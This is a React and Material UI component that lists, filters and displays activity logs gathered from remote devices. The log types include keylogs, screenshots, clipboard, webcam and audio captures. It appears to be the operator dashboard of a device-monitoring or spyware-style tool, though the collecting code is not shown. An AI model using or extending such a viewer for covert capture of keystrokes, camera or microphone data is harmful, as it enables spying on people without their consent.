import React, { useState, useEffect } from 'react';
import {
  Box,
  Paper,
  Table,
  TableBody,
  TableCell,
  TableContainer,
  TableHead,
  TableRow,
  TablePagination,
  IconButton,
  Chip,
  TextField,
  Grid,
  Button,
  Dialog,
  DialogTitle,
  DialogContent,
  DialogActions,
  Typography,
  MenuItem,
  CircularProgress,
  Tooltip,
  Card,
  CardContent
} from '@mui/material';
import {
  Delete,
  Visibility,
  Refresh,
  FilterList,
  Search,
  Download,
  Clear
} from '@mui/icons-material';
import { DatePicker } from '@mui/x-date-pickers/DatePicker';
import { LocalizationProvider } from '@mui/x-date-pickers/LocalizationProvider';
import { AdapterDateFns } from '@mui/x-date-pickers/AdapterDateFns';
import { useSnackbar } from 'notistack';
import apiService from '../services/api';

function LogViewer() {
  const { enqueueSnackbar } = useSnackbar();
  const [logs, setLogs] = useState([]);
  const [loading, setLoading] = useState(false);
  const [page, setPage] = useState(0);
  const [rowsPerPage, setRowsPerPage] = useState(10);
  const [selectedLog, setSelectedLog] = useState(null);
  const [detailOpen, setDetailOpen] = useState(false);
  const [filters, setFilters] = useState({
    type: '',
    deviceId: '',
    startDate: null,
    endDate: null,
    search: ''
  });

  useEffect(() => {
    fetchLogs();
  }, [filters]);

  const fetchLogs = async () => {
    setLoading(true);
    try {
      const response = await apiService.getLogs(filters);
      setLogs(response.data.data);
      enqueueSnackbar('Logs fetched successfully', { variant: 'success' });
    } catch (error) {
      enqueueSnackbar('Failed to fetch logs', { variant: 'error' });
    }
    setLoading(false);
  };

  const handleDelete = async (id) => {
    if (window.confirm('Are you sure you want to delete this log?')) {
      try {
        await apiService.deleteLog(id);
        enqueueSnackbar('Log deleted successfully', { variant: 'success' });
        fetchLogs();
      } catch (error) {
        enqueueSnackbar('Failed to delete log', { variant: 'error' });
      }
    }
  };

  const handleViewDetails = (log) => {
    setSelectedLog(log);
    setDetailOpen(true);
  };

  const handleChangePage = (event, newPage) => {
    setPage(newPage);
  };

  const handleChangeRowsPerPage = (event) => {
    setRowsPerPage(parseInt(event.target.value, 10));
    setPage(0);
  };

  const handleFilterChange = (field, value) => {
    setFilters({ ...filters, [field]: value });
  };

  const clearFilters = () => {
    setFilters({
      type: '',
      deviceId: '',
      startDate: null,
      endDate: null,
      search: ''
    });
  };

  const getSeverityColor = (severity) => {
    const colors = {
      low: 'success',
      medium: 'info',
      high: 'warning',
      critical: 'error'
    };
    return colors[severity] || 'default';
  };

  const getTypeIcon = (type) => {
    const icons = {
      keylog: '⌨️',
      screenshot: '📸',
      system: '💻',
      clipboard: '📋',
      webcam: '📷',
      audio: '🎤',
      alert: '🔔'
    };
    return icons[type] || '📝';
  };

  const filteredLogs = logs.filter(log => {
    if (filters.search) {
      const searchLower = filters.search.toLowerCase();
      return (
        log.type.toLowerCase().includes(searchLower) ||
        log.deviceId.toLowerCase().includes(searchLower) ||
        JSON.stringify(log.data).toLowerCase().includes(searchLower)
      );
    }
    return true;
  });

  return (
    <Box>
      <Typography variant="h4" fontWeight="bold" mb={3}>
        Activity Logs
      </Typography>

      {/* Filters */}
      <Paper sx={{ p: 2, mb: 3 }}>
        <Grid container spacing={2} alignItems="center">
          <Grid item xs={12} md={2}>
            <TextField
              select
              fullWidth
              size="small"
              label="Type"
              value={filters.type}
              onChange={(e) => handleFilterChange('type', e.target.value)}
            >
              <MenuItem value="">All</MenuItem>
              <MenuItem value="keylog">Keylog</MenuItem>
              <MenuItem value="screenshot">Screenshot</MenuItem>
              <MenuItem value="system">System</MenuItem>
              <MenuItem value="clipboard">Clipboard</MenuItem>
              <MenuItem value="webcam">Webcam</MenuItem>
              <MenuItem value="audio">Audio</MenuItem>
              <MenuItem value="alert">Alert</MenuItem>
            </TextField>
          </Grid>
          <Grid item xs={12} md={3}>
            <TextField
              fullWidth
              size="small"
              label="Device ID"
              value={filters.deviceId}
              onChange={(e) => handleFilterChange('deviceId', e.target.value)}
            />
          </Grid>
          <Grid item xs={12} md={3}>
            <LocalizationProvider dateAdapter={AdapterDateFns}>
              <DatePicker
                label="Start Date"
                value={filters.startDate}
                onChange={(value) => handleFilterChange('startDate', value)}
                renderInput={(params) => <TextField {...params} size="small" fullWidth />}
              />
            </LocalizationProvider>
          </Grid>
          <Grid item xs={12} md={3}>
            <LocalizationProvider dateAdapter={AdapterDateFns}>
              <DatePicker
                label="End Date"
                value={filters.endDate}
                onChange={(value) => handleFilterChange('endDate', value)}
                renderInput={(params) => <TextField {...params} size="small" fullWidth />}
              />
            </LocalizationProvider>
          </Grid>
          <Grid item xs={12} md={1}>
            <Button
              variant="outlined"
              color="secondary"
              fullWidth
              onClick={clearFilters}
              startIcon={<Clear />}
            >
              Clear
            </Button>
          </Grid>
        </Grid>
        <Box mt={2}>
          <TextField
            fullWidth
            size="small"
            label="Search logs..."
            value={filters.search}
            onChange={(e) => handleFilterChange('search', e.target.value)}
            InputProps={{
              startAdornment: <Search sx={{ mr: 1, color: 'text.secondary' }} />
            }}
          />
        </Box>
      </Paper>

      {/* Logs Table */}
      <Paper>
        <TableContainer>
          {loading ? (
            <Box display="flex" justifyContent="center" p={5}>
              <CircularProgress />
            </Box>
          ) : (
            <Table>
              <TableHead>
                <TableRow>
                  <TableCell>Type</TableCell>
                  <TableCell>Device</TableCell>
                  <TableCell>Data</TableCell>
                  <TableCell>Severity</TableCell>
                  <TableCell>Timestamp</TableCell>
                  <TableCell align="center">Actions</TableCell>
                </TableRow>
              </TableHead>
              <TableBody>
                {filteredLogs
                  .slice(page * rowsPerPage, page * rowsPerPage + rowsPerPage)
                  .map((log) => (
                    <TableRow 
                      key={log._id}
                      hover
                      sx={{ 
                        backgroundColor: !log.isRead ? 'action.hover' : 'transparent'
                      }}
                    >
                      <TableCell>
                        <Box display="flex" alignItems="center">
                          <Typography mr={1}>{getTypeIcon(log.type)}</Typography>
                          {log.type}
                        </Box>
                      </TableCell>
                      <TableCell>{log.deviceId}</TableCell>
                      <TableCell>
                        <Typography 
                          variant="body2" 
                          sx={{ 
                            maxWidth: 300,
                            overflow: 'hidden',
                            textOverflow: 'ellipsis',
                            whiteSpace: 'nowrap'
                          }}
                        >
                          {typeof log.data === 'object' 
                            ? JSON.stringify(log.data)
                            : log.data}
                        </Typography>
                      </TableCell>
                      <TableCell>
                        <Chip
                          label={log.severity || 'low'}
                          size="small"
                          color={getSeverityColor(log.severity)}
                        />
                      </TableCell>
                      <TableCell>
                        {new Date(log.timestamp).toLocaleString()}
                      </TableCell>
                      <TableCell align="center">
                        <Tooltip title="View Details">
                          <IconButton 
                            size="small" 
                            onClick={() => handleViewDetails(log)}
                            color="primary"
                          >
                            <Visibility />
                          </IconButton>
                        </Tooltip>
                        <Tooltip title="Delete">
                          <IconButton 
                            size="small" 
                            onClick={() => handleDelete(log._id)}
                            color="error"
                          >
                            <Delete />
                          </IconButton>
                        </Tooltip>
                      </TableCell>
                    </TableRow>
                  ))}
              </TableBody>
            </Table>
          )}
        </TableContainer>
        <TablePagination
          component="div"
          count={filteredLogs.length}
          page={page}
          onPageChange={handleChangePage}
          rowsPerPage={rowsPerPage}
          onRowsPerPageChange={handleChangeRowsPerPage}
        />
      </Paper>

      {/* Detail Dialog */}
      <Dialog open={detailOpen} onClose={() => setDetailOpen(false)} maxWidth="md" fullWidth>
        <DialogTitle>
          Log Details
        </DialogTitle>
        <DialogContent>
          {selectedLog && (
            <Grid container spacing={2}>
              <Grid item xs={12}>
                <Card variant="outlined">
                  <CardContent>
                    <Grid container spacing={2}>
                      <Grid item xs={6}>
                        <Typography variant="caption" color="textSecondary">Type</Typography>
                        <Typography variant="body1">
                          {getTypeIcon(selectedLog.type)} {selectedLog.type}
                        </Typography>
                      </Grid>
                      <Grid item xs={6}>
                        <Typography variant="caption" color="textSecondary">Device ID</Typography>
                        <Typography variant="body1">{selectedLog.deviceId}</Typography>
                      </Grid>
                      <Grid item xs={6}>
                        <Typography variant="caption" color="textSecondary">Timestamp</Typography>
                        <Typography variant="body1">
                          {new Date(selectedLog.timestamp).toLocaleString()}
                        </Typography>
                      </Grid>
                      <Grid item xs={6}>
                        <Typography variant="caption" color="textSecondary">Severity</Typography>
                        <Box mt={0.5}>
                          <Chip
                            label={selectedLog.severity || 'low'}
                            size="small"
                            color={getSeverityColor(selectedLog.severity)}
                          />
                        </Box>
                      </Grid>
                      <Grid item xs={12}>
                        <Typography variant="caption" color="textSecondary">Data</Typography>
                        <Paper variant="outlined" sx={{ p: 2, mt: 1, backgroundColor: 'background.default' }}>
                          <Typography variant="body2" component="pre" sx={{ fontFamily: 'monospace', whiteSpace: 'pre-wrap' }}>
                            {typeof selectedLog.data === 'object'
                              ? JSON.stringify(selectedLog.data, null, 2)
                              : selectedLog.data}
                          </Typography>
                        </Paper>
                      </Grid>
                      {selectedLog.deviceInfo && (
                        <Grid item xs={12}>
                          <Typography variant="caption" color="textSecondary">Device Info</Typography>
                          <Paper variant="outlined" sx={{ p: 2, mt: 1, backgroundColor: 'background.default' }}>
                            <Typography variant="body2" component="pre" sx={{ fontFamily: 'monospace' }}>
                              {JSON.stringify(selectedLog.deviceInfo, null, 2)}
                            </Typography>
                          </Paper>
                        </Grid>
                      )}
                    </Grid>
                  </CardContent>
                </Card>
              </Grid>
            </Grid>
          )}
        </DialogContent>
        <DialogActions>
          <Button onClick={() => setDetailOpen(false)}>Close</Button>
        </DialogActions>
      </Dialog>
    </Box>
  );
}

export default LogViewer;
